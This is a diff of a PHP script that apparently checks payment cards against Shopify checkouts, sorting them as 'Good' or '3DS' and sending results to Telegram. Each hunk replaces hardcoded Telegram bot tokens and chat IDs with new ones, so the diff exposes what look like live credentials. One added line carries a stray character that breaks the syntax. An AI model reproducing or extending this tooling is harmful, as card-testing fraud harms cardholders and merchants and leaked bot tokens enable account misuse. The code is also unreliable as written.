@@ -1762,8 +1762,8 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
         'Price'=> $totalamt,
         ]);
         echo $result;
-        $botToken = "7415404162:AAFIBTpq0bMxITA4pEWS8q-1RiWihe888aI";
-        $chatId = "-1002495791047";
+        $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
+        $chatId = "-1003519538285";
         $sentUrlsFile = 'sent_urls.txt';
     
         // Load sent URLs
@@ -1828,8 +1828,8 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
             'Price'=> $totalamt,
             ]);
             echo $result;
-            $botToken = "6788669053:AAHHry0sAOx9rkF0lklZUJrMsAnFjvc1EGs-1RiWihe888aI";
-            $chatId = "-1002495791047";
+            $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
+            $chatId = "-1003519538285";
             $sentUrlsFile = 'sent_urls.txt';
         
             // Load sent URLs
@@ -1900,8 +1900,8 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
                         {
                         echo "Good Shopify, preparing to send file to Telegram..." . PHP_EOL;
                     
-                        $botToken = "7415404162:AAFIBTpq0bMxITA4pEWS8q-1RiWihe888aI";
-                        $chatId = "-1002495791047";
+                        $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
+                        $chatId = "-1003519538285";
                         $sentUrlsFile = 'sent_urls.txt';
                     
                         // Load sent URLs
@@ -1982,8 +1982,8 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
 
                         echo "3DS Shopify, preparing to send file to Telegram..." . PHP_EOL;
                     
-                        $botToken = "7415404162:AAFIBTpq0bMxITA4pEWS8q-1RiWihe888aI";
-                        $chatId = "-1002495791047";
+                        $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
+                        $chatId = "-1003519538285";
                         $sentUrlsFile = 'sent_urls.txt';
                     
                         // Load sent URLs
@@ -2057,8 +2057,8 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
         
                                 echo "3DS Shopify, preparing to send file to Telegram..." . PHP_EOL;
                             
-                                $botToken = "7415404162:AAFIBTpq0bMxITA4pEWS8q-1RiWihe888aI";
-                                $chatId = "-1002495791047";
+                                $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
+                                $chatId = "-1003519538285";o
                                 $sentUrlsFile = 'sent_urls.txt';
                             
                                 // Load sent URLs
